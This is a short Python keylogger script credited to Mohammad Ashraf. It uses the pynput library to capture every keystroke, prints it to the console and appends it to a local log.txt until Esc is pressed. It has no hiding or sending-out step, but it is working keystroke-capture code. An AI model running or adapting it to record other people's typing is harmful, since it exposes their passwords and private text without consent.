#Key Logger
#Author:Mohammad Ashraf
from pynput.keyboard import Key,Listener
# install the pynput library by pip install install pynput
def on_press(key):
    try:
        print("{0} pressed".format(key))
        with open("log.txt" ,"a") as f:#opening the file
            if key == Key.space:
                f.write(str(" "))
            elif key == Key.enter:
                f.write(str("\n"))
            elif key == Key.backspace:
                f.write(str(key).replace("Key.backspace",""))
            else:
                k = str(key).replace("'","")#ashraf
                f.write(str(k))
        f.close()
    except:
        print("Error Occured :(")
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()

#MOhammad Ashraf